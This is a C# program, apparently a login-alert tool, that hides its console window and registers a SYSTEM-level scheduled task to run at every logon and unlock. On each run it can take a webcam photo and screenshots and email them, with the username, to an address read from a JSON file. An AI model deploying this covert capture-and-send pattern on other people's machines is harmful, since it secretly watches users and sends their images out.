using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using OpenCvSharp;
using OpenCvSharp.Extensions;
using Microsoft.Win32.TaskScheduler;
using System.Runtime.InteropServices;
using System.Diagnostics;
using Newtonsoft.Json;
using System.Threading;

namespace email
{
    class Program
    {   //attempt to hide console
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        //set vars
        static string fromEmail;
        static string emailPassword;
        static string emailSMTP;
        static int emailPort;
        static bool usessl;
        static string toEmail;
        static string subject;
        static string emailBody;
        static string attachmentName = $"{System.AppContext.BaseDirectory}capture.jpeg";
        static string secondattachmentName = $"{System.AppContext.BaseDirectory}screenshot.jpg";
        static string CurrentDirectory = Directory.GetCurrentDirectory();
        static bool camCapture;
        static int cameraID;
        static bool screenshot;
        static int shotDelay;
        static int numberofShots;
        static void Main(string[] args)
        {
            IntPtr h = Process.GetCurrentProcess().MainWindowHandle;
            ShowWindow(h, 0);

            parsejson();
            //create task in Windows Task Scheduler and/or update the entry
            createtask();
            if (camCapture)
            {
                //start opencv instace
                VideoCapture capture = new VideoCapture(cameraID);//In my case I had to use video device #1, typically this is Device #0
                Mat image = new Mat();
                //capture image from webcam
                capture.Read(image);
                //load image into a bitmap
                Bitmap img = MatToBitmap(image);
                //save image
                img.Save(attachmentName, ImageFormat.Jpeg);
            }
            if (screenshot)
            {
                takeScreenShot();
            }
            //begin email setup
            MailMessage msg = new MailMessage(
                    fromEmail,
                    toEmail,
                    subject,
                    emailBody
            );
            if (camCapture)
            {
                //add attachment to email
                msg.Attachments.Add(new Attachment(attachmentName));
            }
            if (screenshot)
            {
                for (int i = 0; i < numberofShots; i++)
                {
                    msg.Attachments.Add(new Attachment($"{System.AppContext.BaseDirectory}screenshot{i}.jpg"));
                }
            }
            //set smtp credentials and port
            SmtpClient client = new SmtpClient(emailSMTP) { 
                Port = emailPort,
                EnableSsl = usessl,
                Credentials = new NetworkCredential(fromEmail, emailPassword),
            };
            //send email
            client.Send(msg);
        }
        //convert mat image and return a bitmap
        private static Bitmap MatToBitmap(Mat mat)
        {
            using (var ms = mat.ToMemoryStream())
            {
                return (Bitmap)Image.FromStream(ms);
            }
        }
        private static void createtask()
        {
            // Create a new task definition and assign properties
            TaskDefinition td = TaskService.Instance.NewTask();
            td.RegistrationInfo.Description = "Emails upon login or unlock";
            td.Principal.LogonType = TaskLogonType.InteractiveToken;
            td.Principal.RunLevel = TaskRunLevel.Highest;
            td.Principal.UserId = "SYSTEM";
            // Add a trigger that will fire the task
            td.Triggers.Add(new LogonTrigger { });
            td.Triggers.Add(new SessionStateChangeTrigger(TaskSessionStateChangeType.SessionUnlock) { });
            td.Actions.Add(new ExecAction($"{System.AppContext.BaseDirectory}\\email.exe"));
            // Register the task in the root folder
            const string taskname = "email on Login";
            TaskService.Instance.RootFolder.RegisterTaskDefinition(taskname, td);
        }
        private static void takeScreenShot()
        {
            for (int i = 0; i < numberofShots; i++) {
                Thread.Sleep(shotDelay);
                var captureBmp = new Bitmap(1920, 1024, PixelFormat.Format32bppArgb);
                using (var captureGraphic = Graphics.FromImage(captureBmp))
                {
                    captureGraphic.CopyFromScreen(0, 0, 0, 0, captureBmp.Size);
                    captureBmp.Save($"{System.AppContext.BaseDirectory}screenshot{i}.jpg", ImageFormat.Jpeg);
                }
            }
        }
        //read data from creds.json
        private static void parsejson()
        {
            using (StreamReader r = new StreamReader($"{System.AppContext.BaseDirectory}\\creds.json"))
            {
                var json = r.ReadToEnd();
                //var items = JsonConvert.DeserializeObject<List<Credentials>>(json);
                var creds = JsonConvert.DeserializeObject<dynamic>(json);
                fromEmail = creds.fromEmail;
                emailPassword = creds.emailPassword;
                emailSMTP = creds.emailSMTP;
                emailPort = creds.emailPort;
                usessl = creds.usessl;
                toEmail = creds.toEmail;
                subject = creds.subject;
                emailBody = $"{creds.emailBody}{ Environment.UserName}";
                camCapture = creds.capture;
                cameraID = creds.cameraID;
                screenshot = creds.screenshot;
                shotDelay = creds.shotdelay;
                numberofShots = creds.numberofshots;
            }
        } 
    }
}
